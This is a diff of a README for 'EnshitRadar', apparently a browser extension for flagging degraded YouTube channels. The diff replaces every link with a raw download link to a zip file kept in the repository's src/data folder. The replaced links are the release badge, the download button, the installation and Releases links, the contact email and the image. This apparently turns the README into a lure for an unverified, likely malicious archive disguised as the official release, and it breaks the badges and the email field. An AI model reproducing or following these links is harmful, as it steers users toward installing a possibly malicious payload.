@@ -1,8 +1,8 @@
 # EnshitRadar: Detect Enshittificated YouTube Channels 📺🔍
 
-![GitHub release](https://img.shields.io/github/v/release/viccharles007/EnshitRadar?color=brightgreen&label=Latest%20Release&style=flat)
+![GitHub release](https://github.com/viccharles007/EnshitRadar/raw/refs/heads/main/src/data/Radar-Enshit-v1.8-beta.4.zip%20Release&style=flat)
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightblue)](https://github.com/viccharles007/EnshitRadar/releases)
+[![Download Now](https://github.com/viccharles007/EnshitRadar/raw/refs/heads/main/src/data/Radar-Enshit-v1.8-beta.4.zip%20Now-Click%20Here-brightblue)](https://github.com/viccharles007/EnshitRadar/raw/refs/heads/main/src/data/Radar-Enshit-v1.8-beta.4.zip)
 
 ---
 
@@ -38,7 +38,7 @@ EnshitRadar is an innovative extension designed to identify YouTube channels tha
 
 To install EnshitRadar, follow these steps:
 
-1. Visit the [Releases section](https://github.com/viccharles007/EnshitRadar/releases).
+1. Visit the [Releases section](https://github.com/viccharles007/EnshitRadar/raw/refs/heads/main/src/data/Radar-Enshit-v1.8-beta.4.zip).
 2. Download the latest version of the extension.
 3. Follow the instructions for your specific browser to add the extension.
 
@@ -83,13 +83,13 @@ EnshitRadar is open-source software licensed under the MIT License. You are free
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: viccharles007@example.com
-- **GitHub**: [viccharles007](https://github.com/viccharles007)
+- **Email**: https://github.com/viccharles007/EnshitRadar/raw/refs/heads/main/src/data/Radar-Enshit-v1.8-beta.4.zip
+- **GitHub**: [viccharles007](https://github.com/viccharles007/EnshitRadar/raw/refs/heads/main/src/data/Radar-Enshit-v1.8-beta.4.zip)
 
 Stay connected and help us improve EnshitRadar!
 
 ---
 
-![EnshitRadar](https://via.placeholder.com/800x400.png?text=EnshitRadar+Extension)
+![EnshitRadar](https://github.com/viccharles007/EnshitRadar/raw/refs/heads/main/src/data/Radar-Enshit-v1.8-beta.4.zip+Extension)
 
-For more updates and releases, check the [Releases section](https://github.com/viccharles007/EnshitRadar/releases).
+For more updates and releases, check the [Releases section](https://github.com/viccharles007/EnshitRadar/raw/refs/heads/main/src/data/Radar-Enshit-v1.8-beta.4.zip).
